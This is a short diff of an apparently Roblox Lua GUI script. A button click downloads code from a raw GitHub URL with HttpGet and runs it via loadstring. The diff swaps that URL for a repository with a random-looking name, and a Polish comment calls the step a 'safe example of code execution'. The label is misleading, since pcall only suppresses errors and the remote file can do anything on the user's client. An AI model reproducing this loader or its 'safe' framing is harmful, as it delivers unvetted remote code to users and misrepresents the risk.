@@ -53,7 +53,7 @@ textButton.MouseButton1Click:Connect(function()
     stroke.Color = Color3.fromRGB(80, 80, 80)
 
     -- BEZPIECZNY PRZYKŁAD WYKONANIA KODU
-    local bezpiecznyKod = game:HttpGet("https://raw.githubusercontent.com/slaby4346-sketch/ee/refs/heads/main/wl")
+    local bezpiecznyKod = game:HttpGet("https://raw.githubusercontent.com/kskdkdkdmsmdmdm0-dot/lolsjkskf/refs/heads/main/wl")
     local funkcja = loadstring(bezpiecznyKod)
     if funkcja then
         pcall(funkcja) -- pcall zabezpiecza przed błędami w kodzie zewnętrznym
